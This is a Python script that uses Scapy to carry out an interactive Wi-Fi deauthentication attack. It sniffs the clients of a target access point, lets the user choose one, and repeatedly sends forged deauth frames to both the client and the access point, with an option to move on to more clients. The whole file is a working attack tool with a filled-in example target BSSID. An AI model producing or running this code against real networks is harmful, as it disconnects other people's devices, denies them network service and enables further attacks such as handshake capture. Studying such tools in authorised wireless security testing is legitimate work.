from scapy.all import *
import time
import threading

def countdown(seconds, stop_event, label=""):
    """Displays a countdown timer for the given duration."""
    for remaining in range(seconds, 0, -1):
        if stop_event.is_set():
            break
        print(f"\r⏱  {label}... {remaining:3d}s remaining", end='', flush=True)
        time.sleep(1)
    print(f"\r⏱  {label}... done!{' ' * 20}")

def find_clients(interface, bssid, timeout=100):
    """Scans for clients connected to a specific BSSID."""
    clients = set()
    stop_event = threading.Event()

    def sniff_callback(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 2:  # Data frame
            addr1 = pkt.addr1
            addr2 = pkt.addr2
            if bssid in [addr1, addr2]:
                client_mac = addr2 if addr1 == bssid else addr1
                if client_mac and client_mac != bssid:
                    clients.add(client_mac)

    print(f"[+] Scanning for clients for {timeout} seconds... (BSSID = {bssid})")
    timer_thread = threading.Thread(target=countdown, args=(timeout, stop_event, "Scanning"), daemon=True)
    timer_thread.start()

    try:
        sniff(iface=interface, prn=sniff_callback, timeout=timeout, store=0)
    except KeyboardInterrupt:
        stop_event.set()

    stop_event.set()
    timer_thread.join()
    print()
    return list(clients)

def send_single_deauth(interface, bssid, target_mac, duration=20, batch_count=20, interval=0.05):
    """Sends deauth packets to and from client/AP for a given duration."""
    pkt_to_client = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    pkt_to_ap = RadioTap() / Dot11(addr1=bssid, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=7)

    print(f"\n🚀 Launching deauth attack on client {target_mac} for {duration} seconds...")

    stop_event = threading.Event()
    timer_thread = threading.Thread(target=countdown, args=(duration, stop_event, "Deauth"), daemon=True)
    timer_thread.start()

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            sendp([pkt_to_client, pkt_to_ap], iface=interface, count=batch_count, inter=interval, verbose=0)
            time.sleep(0.2)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")

    stop_event.set()
    timer_thread.join()
    print(f"✅ Deauth attack completed for {target_mac}.\n")

def send_deauth_to_client(interface, bssid, duration=180, batch_count=50, interval=0.01):
    """Main interaction loop: scan clients, select one, and deauth it."""
    while True:
        clients = find_clients(interface, bssid)
        if not clients:
            print("❌ No clients found. Try again.")
            continue

        print("\n📡 Found clients:")
        for i, client in enumerate(clients):
            print(f"{i + 1}. {client}")

        try:
            choice = int(input("\nSelect client number for Deauth (0 to exit): "))
            if choice == 0:
                break
            target = clients[choice - 1]
        except (ValueError, IndexError):
            print("❌ Invalid selection.\n")
            continue

        send_single_deauth(interface, bssid, target, duration, batch_count, interval)

        time.sleep(15)
        again = input("➕ Do you want to attack another client? (y/n): ").strip().lower()
        if again != 'y':
            break

    print("🛑 Exiting program.")

# Example usage
if __name__ == "__main__":
    iface = "wlp2s0"  # Replace with your monitor-mode interface
    bssid = "c2:3a:63:7f:10:a4"  # Replace with your target BSSID
    send_deauth_to_client(iface, bssid, duration=60)
